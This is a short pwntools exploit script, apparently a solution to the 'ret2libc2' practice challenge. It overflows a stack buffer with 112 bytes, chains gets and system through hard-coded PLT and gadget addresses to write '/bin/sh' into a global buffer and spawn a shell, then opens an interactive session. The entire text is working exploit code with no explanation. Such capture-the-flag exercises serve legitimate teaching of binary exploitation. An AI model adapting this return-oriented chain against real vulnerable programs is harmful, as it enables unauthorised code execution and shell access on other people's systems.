from pwn import *

gets_plt=0x08048460
system_plt=0x08048490
pop_ret_addr=0x0804843D
buf2_addr=0x0804A080
payload=b'A'*112+p32(gets_plt)+p32(pop_ret_addr)+p32(buf2_addr)+p32(system_plt)+p32(buf2_addr)+p32(buf2_addr)

sh=process('./ret2libc2')
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
